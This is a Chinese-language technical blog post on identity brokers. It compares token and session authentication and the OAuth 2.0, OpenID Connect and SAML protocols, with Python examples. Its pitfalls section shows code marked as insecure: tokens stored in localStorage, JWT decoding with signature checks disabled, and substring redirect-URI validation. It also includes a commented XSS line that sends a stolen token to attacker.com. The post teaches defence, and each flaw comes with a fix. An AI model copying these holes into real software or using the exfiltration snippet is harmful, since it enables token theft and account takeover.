---
title: "身份代理：分布式系统中的集中式身份验证"
date: 2021-12-24
lang: zh-CN
categories: Development
tags: [Architecture, Security, Authentication]
excerpt: "身份代理在多个系统中集中管理身份验证，但实现选择会影响安全性、性能和用户体验。了解模式、权衡和陷阱。"
thumbnail: /assets/security/lock.png
series: authentication
---

身份代理作为分布式系统中身份验证蔓延问题的解决方案应运而生。身份代理集中管理这些问题，提供单点登录（SSO）和统一的身份管理，而不是让每个应用程序管理自己的用户凭据和身份验证逻辑。然而，这种集中化引入了新的架构挑战：会话管理复杂性、单点故障以及安全性与用户体验之间的微妙平衡。

本文探讨了企业系统、云应用程序和微服务架构中的身份代理模式。我们将剖析常见的实现方法，评估 OAuth 2.0、SAML 和 OpenID Connect 之间的协议选择，并理解基于令牌和基于会话的身份验证之间的权衡。通过真实世界的实现和安全事件，我们揭示了为什么身份代理既必不可少又复杂。

## 理解身份代理

在深入实现模式之前，理解身份代理的作用以及它们存在的原因至关重要。身份代理位于应用程序和身份提供者之间，转换身份验证协议并管理用户会话。

### 核心问题：身份验证蔓延

没有身份代理时，每个应用程序独立管理身份验证：

!!!error "🚫 没有身份代理的问题"
    **凭据重复**
    - 用户为每个应用程序维护单独的凭据
    - 跨系统重用密码会产生安全风险
    - 密码重置需要联系每个应用程序
    - 没有统一的密码策略执行
    
    **集成复杂性**
    - 每个应用程序实现自己的身份验证
    - 与身份提供者的多个集成
    - 不一致的安全实现
    - 难以添加新的身份提供者
    
    **用户体验问题**
    - 用户分别登录每个应用程序
    - 跨系统没有单点登录
    - 会话管理不一致
    - 注销不会在应用程序之间传播

身份代理通过集中身份验证逻辑并为应用程序提供统一接口来解决这些问题。

### 身份代理提供什么

身份代理充当应用程序和身份提供者之间的中介：

!!!anote "🔑 身份代理功能"
    **协议转换**
    - 应用程序使用一种协议（例如 OAuth 2.0）
    - 身份提供者使用不同的协议（SAML、LDAP、OAuth）
    - 代理在协议之间进行转换
    - 应用程序不需要特定于提供者的代码
    
    **单点登录（SSO）**
    - 用户使用代理进行一次身份验证
    - 代理向应用程序颁发令牌/会话
    - 应用程序信任代理的身份验证
    - 跨多个应用程序的无缝访问
    
    **身份联合**
    - 连接多个身份提供者
    - 用户可以使用企业 AD、Google、GitHub 等进行身份验证
    - 代理规范化用户属性
    - 跨提供者的统一身份
    
    **会话管理**
    - 集中式会话跟踪
    - 跨所有应用程序的单点注销
    - 会话超时策略
    - 并发会话控制

流行的身份代理包括 Keycloak、Auth0、Okta、Azure AD 和 AWS Cognito。

## 基于令牌与基于会话的身份验证

身份代理可以使用令牌或会话实现身份验证，每种方式都有不同的权衡。

### 基于令牌的身份验证：无状态且可扩展

基于令牌的身份验证使用加密签名的令牌（通常是 JWT）来表示已验证的用户：

```python
# 基于令牌的身份验证流程
from jose import jwt
from datetime import datetime, timedelta

class TokenAuthBroker:
    def __init__(self, secret_key):
        self.secret_key = secret_key
    
    def authenticate(self, username, password):
        # 使用身份提供者验证凭据
        if self.verify_credentials(username, password):
            # 颁发 JWT 令牌
            payload = {
                'sub': username,
                'iat': datetime.utcnow(),
                'exp': datetime.utcnow() + timedelta(hours=1),
                'roles': self.get_user_roles(username)
            }
            token = jwt.encode(payload, self.secret_key, algorithm='HS256')
            return token
        return None
    
    def validate_token(self, token):
        try:
            payload = jwt.decode(token, self.secret_key, algorithms=['HS256'])
            return payload
        except jwt.ExpiredSignatureError:
            return None
        except jwt.JWTError:
            return None

# 应用程序在不联系代理的情况下验证令牌
def protected_endpoint(request):
    token = request.headers.get('Authorization', '').replace('Bearer ', '')
    payload = broker.validate_token(token)
    
    if payload:
        return f"欢迎 {payload['sub']}"
    return "未授权", 401
```

!!!success "✅ 基于令牌的优势"
    **无状态架构**
    - 不需要服务器端会话存储
    - 应用程序独立验证令牌
    - 无需会话复制即可水平扩展
    - 负载均衡器中不需要会话亲和性
    
    **性能**
    - 每个请求无需数据库查找
    - 验证是加密签名检查
    - 减少身份验证检查的延迟
    - 降低身份代理的负载
    
    **微服务友好**
    - 令牌在服务之间传递
    - 不需要共享会话存储
    - 服务独立验证令牌
    - 解耦架构

然而，基于令牌的身份验证有显著的缺点：

!!!warning "⚠️ 基于令牌的挑战"
    **撤销困难**
    - 令牌在过期前有效
    - 无法立即撤销被泄露的令牌
    - 注销不会使现有令牌失效
    - 需要令牌黑名单（破坏无状态优势）
    
    **令牌大小**
    - JWT 包含用户数据和声明
    - 每个请求都发送
    - 比会话 ID 大
    - 移动客户端的带宽开销
    
    **安全风险**
    - 令牌存储在浏览器中（XSS 漏洞）
    - 长期令牌增加暴露窗口
    - 令牌被盗允许在过期前冒充
    - 刷新令牌管理复杂性

### 基于会话的身份验证：有状态但可控

基于会话的身份验证使用服务器端会话，将会话 ID 发送给客户端：

```python
# 基于会话的身份验证流程
import secrets
from datetime import datetime, timedelta

class SessionAuthBroker:
    def __init__(self):
        self.sessions = {}  # 生产环境：Redis、数据库
    
    def authenticate(self, username, password):
        # 使用身份提供者验证凭据
        if self.verify_credentials(username, password):
            # 创建会话
            session_id = secrets.token_urlsafe(32)
            self.sessions[session_id] = {
                'username': username,
                'created': datetime.utcnow(),
                'expires': datetime.utcnow() + timedelta(hours=1),
                'roles': self.get_user_roles(username)
            }
            return session_id
        return None
    
    def validate_session(self, session_id):
        session = self.sessions.get(session_id)
        if session and session['expires'] > datetime.utcnow():
            return session
        return None
    
    def revoke_session(self, session_id):
        # 立即撤销
        if session_id in self.sessions:
            del self.sessions[session_id]
            return True
        return False

# 应用程序使用代理检查会话
def protected_endpoint(request):
    session_id = request.cookies.get('session_id')
    session = broker.validate_session(session_id)
    
    if session:
        return f"欢迎 {session['username']}"
    return "未授权", 401
```

!!!success "✅ 基于会话的优势"
    **立即撤销**
    - 会话存储在服务器端
    - 注销立即使会话失效
    - 被泄露的会话可以立即撤销
    - 细粒度的会话控制
    
    **更小的客户端存储**
    - 只有会话 ID 发送给客户端
    - 最小的带宽开销
    - 用户数据存储在服务器端
    - 减少 XSS 暴露
    
    **灵活的会话管理**
    - 无需客户端更改即可更新会话数据
    - 跟踪会话活动和位置
    - 实现并发会话限制
    - 丰富的会话元数据

基于会话的身份验证也有权衡：

!!!warning "⚠️ 基于会话的挑战"
    **可扩展性复杂性**
    - 需要共享会话存储（Redis、数据库）
    - 跨服务器的会话复制
    - 负载均衡器会话亲和性或粘性会话
    - 水平扩展更复杂
    
    **性能开销**
    - 每个请求都需要数据库查找
    - 到会话存储的网络延迟
    - 身份代理的负载更高
    - 大规模时的潜在瓶颈
    
    **分布式系统挑战**
    - 微服务必须调用代理进行验证
    - 每个请求的网络依赖
    - 服务链中的延迟增加
    - 代理成为关键依赖

### 混合方法：短期令牌与刷新令牌

许多现代系统使用混合方法，结合两者的优势：

```python
# 使用访问令牌和刷新令牌的混合身份验证
class HybridAuthBroker:
    def __init__(self, secret_key):
        self.secret_key = secret_key
        self.refresh_tokens = {}  # 服务器端刷新令牌存储
    
    def authenticate(self, username, password):
        if self.verify_credentials(username, password):
            # 短期访问令牌（15 分钟）
            access_token = jwt.encode({
                'sub': username,
                'exp': datetime.utcnow() + timedelta(minutes=15),
                'type': 'access'
            }, self.secret_key, algorithm='HS256')
            
            # 长期刷新令牌（7 天）存储在服务器端
            refresh_token = secrets.token_urlsafe(32)
            self.refresh_tokens[refresh_token] = {
                'username': username,
                'expires': datetime.utcnow() + timedelta(days=7)
            }
            
            return {
                'access_token': access_token,
                'refresh_token': refresh_token,
                'expires_in': 900  # 15 分钟
            }
        return None
    
    def refresh_access_token(self, refresh_token):
        # 验证刷新令牌（服务器端检查）
        token_data = self.refresh_tokens.get(refresh_token)
        if token_data and token_data['expires'] > datetime.utcnow():
            # 颁发新的访问令牌
            access_token = jwt.encode({
                'sub': token_data['username'],
                'exp': datetime.utcnow() + timedelta(minutes=15),
                'type': 'access'
            }, self.secret_key, algorithm='HS256')
            return access_token
        return None
    
    def logout(self, refresh_token):
        # 撤销刷新令牌
        if refresh_token in self.refresh_tokens:
            del self.refresh_tokens[refresh_token]
```

!!!tip "🎯 混合方法的优势"
    **平衡的安全性**
    - 短期访问令牌限制暴露窗口
    - 被泄露的访问令牌很快过期
    - 刷新令牌可以立即撤销
    - 注销使刷新令牌失效
    
    **性能和可扩展性**
    - 访问令牌本地验证（无状态）
    - 刷新令牌检查不频繁（每 15 分钟）
    - 降低身份代理的负载
    - 像基于令牌的身份验证一样可扩展
    
    **用户体验**
    - 在后台无缝刷新令牌
    - 无需频繁重新身份验证
    - 注销立即生效
    - 安全性和便利性之间的平衡

这种混合方法被 OAuth 2.0 和 OpenID Connect 使用，代表了行业最佳实践。

## 协议选择：OAuth 2.0、SAML 和 OpenID Connect

身份代理必须支持各种身份验证协议。理解它们的差异对于实现决策至关重要。

### OAuth 2.0：授权框架

OAuth 2.0 是一个授权框架，而不是身份验证协议，尽管经常用于两者：

```python
# OAuth 2.0 授权码流程
from flask import Flask, request, redirect
import requests

app = Flask(__name__)

BROKER_AUTH_URL = 'https://broker.example.com/oauth/authorize'
BROKER_TOKEN_URL = 'https://broker.example.com/oauth/token'
CLIENT_ID = 'your_client_id'
CLIENT_SECRET = 'your_client_secret'
REDIRECT_URI = 'https://app.example.com/callback'

@app.route('/login')
def login():
    # 将用户重定向到身份代理
    auth_url = f"{BROKER_AUTH_URL}?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope=openid profile email"
    return redirect(auth_url)

@app.route('/callback')
def callback():
    # 代理使用授权码重定向回来
    code = request.args.get('code')
    
    # 用授权码交换访问令牌
    token_response = requests.post(BROKER_TOKEN_URL, data={
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': REDIRECT_URI,
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET
    })
    
    tokens = token_response.json()
    access_token = tokens['access_token']
    
    # 使用访问令牌获取用户信息
    user_response = requests.get(
        'https://broker.example.com/userinfo',
        headers={'Authorization': f'Bearer {access_token}'}
    )
    
    user_info = user_response.json()
    # 使用 user_info 创建应用程序会话
    return f"欢迎 {user_info['name']}"
```

!!!anote "📋 OAuth 2.0 特征"
    **设计用于**
    - 委托授权
    - 第三方 API 访问
    - 移动和 Web 应用程序
    - 现代 REST API
    
    **优势**
    - 简单的基于 HTTP 的协议
    - 广泛的行业采用
    - 移动友好
    - 灵活的授权类型
    
    **局限性**
    - 不是为身份验证设计的
    - 没有标准的用户信息格式
    - 需要额外的配置文件端点
    - 令牌格式未标准化

### OpenID Connect：OAuth 2.0 之上的身份验证层

OpenID Connect（OIDC）专门为身份验证扩展了 OAuth 2.0：

```python
# OpenID Connect 在 OAuth 2.0 流程中添加 ID 令牌
from jose import jwt

@app.route('/oidc-callback')
def oidc_callback():
    code = request.args.get('code')
    
    # 用授权码交换令牌
    token_response = requests.post(BROKER_TOKEN_URL, data={
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': REDIRECT_URI,
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET
    })
    
    tokens = token_response.json()
    id_token = tokens['id_token']  # OIDC 添加 ID 令牌
    access_token = tokens['access_token']
    
    # 验证和解码 ID 令牌
    # ID 令牌包含用户身份声明
    user_claims = jwt.decode(
        id_token,
        key=get_broker_public_key(),
        algorithms=['RS256'],
        audience=CLIENT_ID
    )
    
    # ID 令牌包含：sub、name、email 等
    return f"欢迎 {user_claims['name']} ({user_claims['email']})"
```

!!!success "✅ OpenID Connect 优势"
    **专为身份验证而构建**
    - ID 令牌包含用户身份
    - 标准化的用户声明
    - 不需要额外的配置文件端点
    - 清晰的身份验证语义
    
    **安全功能**
    - ID 令牌是签名的 JWT
    - 加密验证
    - 受众和颁发者验证
    - 用于重放保护的 nonce
    
    **行业标准**
    - 所有主要身份提供者都支持
    - 广泛的库支持
    - 文档完善的规范
    - 积极的开发和更新

### SAML 2.0：企业标准

SAML（安全断言标记语言）是传统的企业身份验证协议：

```python
# SAML 2.0 身份验证流程（简化）
from lxml import etree
from signxml import XMLVerifier

@app.route('/saml/login')
def saml_login():
    # 生成 SAML 身份验证请求
    saml_request = f"""
    <samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                        ID="{generate_request_id()}"
                        Version="2.0"
                        IssueInstant="{datetime.utcnow().isoformat()}Z"
                        Destination="{BROKER_SSO_URL}">
        <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
            {SERVICE_PROVIDER_ID}
        </saml:Issuer>
    </samlp:AuthnRequest>
    """
    
    # 编码并重定向到身份代理
    encoded_request = base64.b64encode(saml_request.encode()).decode()
    sso_url = f"{BROKER_SSO_URL}?SAMLRequest={encoded_request}"
    return redirect(sso_url)

@app.route('/saml/acs', methods=['POST'])
def saml_assertion_consumer():
    # 代理将 SAML 响应发送回来
    saml_response = request.form['SAMLResponse']
    decoded_response = base64.b64decode(saml_response)
    
    # 验证 SAML 断言签名
    xml_doc = etree.fromstring(decoded_response)
    verified_data = XMLVerifier().verify(
        xml_doc,
        x509_cert=get_broker_certificate()
    ).signed_xml
    
    # 从断言中提取用户属性
    nameid = xml_doc.find('.//{urn:oasis:names:tc:SAML:2.0:assertion}NameID').text
    attributes = extract_saml_attributes(xml_doc)
    
    return f"欢迎 {attributes['name']}"
```

!!!anote "🏢 SAML 特征"
    **设计用于**
    - 企业单点登录
    - 组织之间的联合
    - 传统企业系统
    - 强安全要求
    
    **优势**
    - 成熟且经过实战检验
    - 丰富的属性交换
    - 强大的安全功能
    - 企业采用
    
    **劣势**
    - 基于 XML（冗长且复杂）
    - 不适合移动设备
    - 学习曲线陡峭
    - 现代工具有限

### 协议选择指南

!!!tip "🎯 选择正确的协议"
    **使用 OpenID Connect 当：**
    - 构建新应用程序
    - 需要移动支持
    - 想要现代 REST API
    - 需要简单集成
    - 面向消费者用户
    
    **使用 SAML 当：**
    - 与企业系统集成
    - 企业 IT 策略要求
    - 需要丰富的属性交换
    - 与其他组织联合
    - 需要传统系统兼容性
    
    **使用 OAuth 2.0 当：**
    - 需要 API 授权（不是身份验证）
    - 第三方访问资源
    - 委托权限
    - 与 OIDC 结合用于身份验证

像 Keycloak 这样的现代身份代理支持所有三种协议，允许应用程序根据需要进行选择。

## 常见陷阱和安全问题

身份代理实现经常遭受常见的安全漏洞和设计错误。

### 陷阱 1：在本地存储中存储令牌

许多应用程序将令牌存储在浏览器本地存储中，从而产生 XSS 漏洞：

```javascript
// ❌ 不安全：在本地存储中存储令牌
function login(username, password) {
    fetch('/api/login', {
        method: 'POST',
        body: JSON.stringify({ username, password })
    })
    .then(res => res.json())
    .then(data => {
        // 容易受到 XSS 攻击
        localStorage.setItem('access_token', data.access_token);
        localStorage.setItem('refresh_token', data.refresh_token);
    });
}

// 任何 XSS 漏洞都可以窃取令牌
// <script>
//   fetch('https://attacker.com/steal?token=' + localStorage.getItem('access_token'));
// </script>
```

!!!error "🚫 本地存储漏洞"
    **XSS 攻击向量**
    - JavaScript 可以访问本地存储
    - 任何 XSS 漏洞都会暴露令牌
    - 第三方脚本可以窃取令牌
    - 没有针对脚本注入的保护
    
    **影响**
    - 完全账户接管
    - 令牌在过期前有效
    - 攻击者可以冒充用户
    - 难以检测盗窃

使用 HTTP-only cookie 的更好方法：

```javascript
// ✅ 安全：使用 HTTP-only cookie
// 服务器设置 HTTP-only cookie（JavaScript 无法访问）
@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    tokens = broker.authenticate(data['username'], data['password'])
    
    response = make_response({'status': 'success'})
    
    # HTTP-only cookie 防止 JavaScript 访问
    response.set_cookie(
        'access_token',
        tokens['access_token'],
        httponly=True,  # 防止 JavaScript 访问
        secure=True,    # 仅 HTTPS
        samesite='Strict'  # CSRF 保护
    )
    
    return response

// 客户端：不需要令牌处理
function login(username, password) {
    fetch('/api/login', {
        method: 'POST',
        credentials: 'include',  // 发送 cookie
        body: JSON.stringify({ username, password })
    });
}
```

### 陷阱 2：缺少令牌验证

应用程序有时会跳过适当的令牌验证：

```python
# ❌ 不安全：信任令牌而不验证
@app.route('/api/user')
def get_user():
    token = request.headers.get('Authorization', '').replace('Bearer ', '')
    
    # 解码而不验证！
    payload = jwt.decode(token, options={"verify_signature": False})
    
    return {'user': payload['sub']}  # 攻击者可以伪造令牌！
```

!!!error "🚫 验证失败"
    **缺少签名验证**
    - 攻击者可以创建假令牌
    - 没有加密验证
    - 完全绕过身份验证
    
    **缺少过期检查**
    - 过期的令牌仍然被接受
    - 被盗的令牌无限期有效
    - 没有基于时间的安全性
    
    **缺少受众验证**
    - 接受来自其他应用程序的令牌
    - 跨应用程序令牌重用
    - 权限提升风险

适当的令牌验证：

```python
# ✅ 安全：完整的令牌验证
from jose import jwt, JWTError

@app.route('/api/user')
def get_user():
    token = request.headers.get('Authorization', '').replace('Bearer ', '')
    
    try:
        payload = jwt.decode(
            token,
            key=get_public_key(),
            algorithms=['RS256'],  # 指定允许的算法
            audience='my-application',  # 验证受众
            issuer='https://broker.example.com'  # 验证颁发者
        )
        
        # 令牌有效且已验证
        return {'user': payload['sub']}
        
    except jwt.ExpiredSignatureError:
        return {'error': '令牌已过期'}, 401
    except jwt.JWTClaimsError:
        return {'error': '无效的声明'}, 401
    except JWTError:
        return {'error': '无效的令牌'}, 401
```

### 陷阱 3：不安全的重定向 URI

OAuth 2.0 重定向 URI 验证对于安全性至关重要：

```python
# ❌ 不安全：弱重定向 URI 验证
@app.route('/oauth/authorize')
def authorize():
    client_id = request.args.get('client_id')
    redirect_uri = request.args.get('redirect_uri')
    
    # 弱验证：子字符串匹配
    if 'example.com' in redirect_uri:
        # 生成授权码
        code = generate_auth_code(client_id)
        return redirect(f"{redirect_uri}?code={code}")
    
    return "无效的重定向 URI", 400

# 攻击者可以使用：https://evil.com?victim=example.com
# 验证通过，授权码发送给攻击者！
```

!!!error "🚫 重定向 URI 漏洞"
    **开放重定向**
    - 授权码发送给攻击者
    - 可能的账户接管
    - 启用钓鱼攻击
    
    **子域攻击**
    - 弱验证允许子域
    - 攻击者注册恶意子域
    - 窃取授权码

安全的重定向 URI 验证：

```python
# ✅ 安全：严格的重定向 URI 验证
REGISTERED_CLIENTS = {
    'client123': {
        'redirect_uris': [
            'https://app.example.com/callback',
            'https://app.example.com/oauth/callback'
        ]
    }
}

@app.route('/oauth/authorize')
def authorize():
    client_id = request.args.get('client_id')
    redirect_uri = request.args.get('redirect_uri')
    
    # 与注册的 URI 精确匹配
    client = REGISTERED_CLIENTS.get(client_id)
    if not client or redirect_uri not in client['redirect_uris']:
        return "无效的重定向 URI", 400
    
    code = generate_auth_code(client_id)
    return redirect(f"{redirect_uri}?code={code}")
```

## 结论

身份代理在分布式系统中集中管理身份验证，提供单点登录、协议转换和统一的身份管理。然而，实现选择会显著影响安全性、性能和用户体验。

基于令牌和基于会话的身份验证之间的选择涉及基本权衡。基于令牌的身份验证提供无状态可扩展性和微服务兼容性，但在撤销和安全风险方面存在困难。基于会话的身份验证提供立即撤销和细粒度控制，但引入了可扩展性复杂性。使用短期访问令牌和服务器端刷新令牌的混合方法代表了行业最佳实践，平衡了安全性、性能和用户体验。

协议选择取决于您的环境和要求。OpenID Connect 是新应用程序的现代标准，提供简单的集成、移动支持和专为身份验证而构建的功能。尽管复杂，SAML 对于企业集成和传统系统仍然至关重要。OAuth 2.0 服务于授权需求，但需要 OpenID Connect 才能进行适当的身份验证。

常见陷阱困扰着身份代理实现。在本地存储中存储令牌会产生 XSS 漏洞——改用 HTTP-only cookie。缺少令牌验证允许攻击者伪造令牌——始终验证签名、过期、受众和颁发者。弱重定向 URI 验证使授权码被盗——对注册的 URI 使用精确匹配。

身份代理是现代分布式系统的基本基础设施，但它们需要仔细实现。理解身份验证方法之间的权衡、选择适当的协议以及避免常见的安全陷阱可确保您的身份代理增强而不是破坏您的安全态势。复杂性是合理的，因为它带来了好处：统一的身份验证、改进的用户体验以及整个应用程序生态系统的集中安全控制。
